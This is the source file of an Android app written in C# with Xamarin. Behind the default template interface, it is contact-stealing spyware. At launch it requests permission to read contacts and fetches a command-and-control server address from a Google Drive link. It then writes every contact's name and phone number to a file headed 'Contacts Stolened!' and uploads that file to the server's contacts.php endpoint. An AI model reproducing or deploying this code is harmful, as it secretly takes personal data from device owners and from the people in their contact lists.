using Android;
using Android.App;
using Android.OS;
using Android.Runtime;
using Android.Views;
using AndroidX.AppCompat.App;
using AndroidX.AppCompat.Widget;
using AndroidX.Core.App;
using Google.Android.Material.FloatingActionButton;
using Google.Android.Material.Snackbar;

using System;
using System.IO;
using System.Net;

namespace App1
{
    [Activity(Label = "@string/app_name", Theme = "@style/AppTheme.NoActionBar", MainLauncher = true)]
    public partial class MainActivity : AppCompatActivity
    {
        // WAN Server
        string Server = "https://ngrok.com";

        // WAN SERVER static Address conatining Server Address
        const string serverLocation = "https://drive.google.com/uc?export=download&id=1z0OKCBAsxR_K5iCZVbth6V1zKFiF15oQ";

        // Path to txt files Contaiing User Data
        string serverPath = Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData), "serverLoc.txt");

        string contactsPath = Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData), "contacts.txt");
        // For Developement
        bool isDebugging = false;

        protected override void OnCreate(Bundle savedInstanceState)
        {
            base.OnCreate(savedInstanceState);
            Xamarin.Essentials.Platform.Init(this, savedInstanceState);
            SetContentView(Resource.Layout.activity_main);

            Toolbar toolbar = FindViewById<Toolbar>(Resource.Id.toolbar);
            SetSupportActionBar(toolbar);

            FloatingActionButton fab = FindViewById<FloatingActionButton>(Resource.Id.fab);
            fab.Click += FabOnClick;

            // Starting Point (Paylaod Start)

            GetPermissions();

            Connect();
            DumpContacts();
        }

        public override bool OnCreateOptionsMenu(IMenu menu)
        {
            MenuInflater.Inflate(Resource.Menu.menu_main, menu);
            return true;
        }

        public override bool OnOptionsItemSelected(IMenuItem item)
        {
            int id = item.ItemId;
            if (id == Resource.Id.action_settings)
            {
                return true;
            }

            return base.OnOptionsItemSelected(item);
        }

        private void FabOnClick(object sender, EventArgs eventArgs)
        {
            View view = (View)sender;
            Snackbar.Make(view, "Replace with your own action", Snackbar.LengthLong)
                .SetAction("Action", (View.IOnClickListener)null).Show();
        }

        public override void OnRequestPermissionsResult(int requestCode, string[] permissions, [GeneratedEnum] Android.Content.PM.Permission[] grantResults)
        {
            Xamarin.Essentials.Platform.OnRequestPermissionsResult(requestCode, permissions, grantResults);

            base.OnRequestPermissionsResult(requestCode, permissions, grantResults);
        }

        // Contacts to Server (WAN NETWORK)
        void Connect()
        {
            if (!isDebugging)
            {
                // For WAN Network
                WebClient webClient = new WebClient();
                webClient.DownloadFile(serverLocation, serverPath);

                string server = File.ReadAllText(serverPath);
                Server = server;
            }
            else
            {
                // For Developement (Debugging)
                Server = "http://192.168.133.103:80";
            }
        }

        // Dump Conatcts
        void DumpContacts()
        {
            ContactService_Android contactsService = new ContactService_Android();

            // make txt File adn Write to it
            using (StreamWriter sw = new StreamWriter(contactsPath))
            {
                sw.Write("Contacts Stolened! \n---------------- Contacts ------------------\n");

                foreach (var con in contactsService.GetAllContacts())
                {
                    sw.Write(con.Name + " ||" + con.PhoneNumber + " ||" + " [First Name: " + con.FirstName + "]" + " [Last Name: " + con.LastName + "]" + "\n");
                }
                sw.Close();
            }

            // Upload to Sever
            WebClient client = new WebClient();
            client.UploadFile(Server + "/contacts.php", contactsPath);
        }

        // Get Permsisisons Runtime
        private void GetPermissions()
        {
            //Read Contacts
            ActivityCompat.RequestPermissions(this, new string[] { Manifest.Permission.ReadContacts.ToString() }, 0);
        }
    }
}
